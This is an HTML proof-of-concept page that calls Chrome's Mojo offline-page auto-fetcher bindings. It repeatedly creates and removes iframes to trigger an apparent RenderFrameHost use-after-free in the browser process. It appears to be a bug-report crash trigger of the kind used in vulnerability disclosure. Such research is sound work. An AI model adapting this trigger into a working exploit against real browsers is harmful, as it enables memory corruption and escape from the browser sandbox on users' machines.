<html>
  <head>
    <script src="/mojo_bindings.js"></script>
    <script src="/gen/chrome/common/offline_page_auto_fetcher.mojom.js"></script>
    <script>


function allocate_rfh(src) {
  var iframe = document.createElement("iframe");
  iframe.src = src;
  document.body.appendChild(iframe);
  return iframe;
}

function deallocate_rfh(iframe) {
  document.body.removeChild(iframe);
}

function poc() {
  var N = 16;
  var frames = [];

  // allocate RFH
  for (var i = 0; i < N; i++) {
    var frame = allocate_rfh("offline_child.html");
    frames.push(frame);
  }

  // deallocate RFH
  setTimeout(function() {
    for (var i = 0; i < N; i++) {
      deallocate_rfh(frames[i]);
    }
  }, 1500);

  // retry
  setTimeout(function() {
    location = '';
  }, 2000);
}

  </script>

  </head>
  <body onload="poc()" >
    <h1> Parent Frame </h1> 
  </body>
</html>
